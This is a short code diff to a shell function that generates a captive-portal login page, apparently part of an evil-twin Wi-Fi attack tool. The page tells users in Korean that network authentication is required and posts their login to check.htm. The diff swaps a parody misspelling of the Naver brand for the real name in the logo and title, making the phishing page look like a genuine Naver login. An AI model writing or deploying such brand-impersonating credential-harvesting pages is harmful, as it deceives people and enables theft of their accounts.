@@ -1460,7 +1460,7 @@ function set_captive_portal_page() {
 	echo -e "echo -e '\t<body>'"
 	echo -e "echo -e '\t\t<img src=\"${pixelfile}\" style=\"display: none;\"/>'"
 	echo -e "echo -e '\t\t<div class=\"content\">'"
-	echo -e "echo -e '\t\t\t<div class=\"logo\">네입뻐</div>'"
+	echo -e "echo -e '\t\t\t<div class=\"logo\">NAVER</div>'"
 	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
 	echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
 	echo -e "echo -e '\t\t\t\t\t<p>안전한 인터넷 연결을 위해<br/>무선 네트워크 인증이 필요합니다.</p>'"
@@ -1489,7 +1489,7 @@ function set_captive_portal_page() {
 		echo '<html>'
 		echo -e '\t<head>'
 		echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
-		echo -e '\t\t<title>네입뻐 인증</title>'
+		echo -e '\t\t<title>네이버 인증</title>'
 		echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
 		echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
 		echo -e '\t</head>'
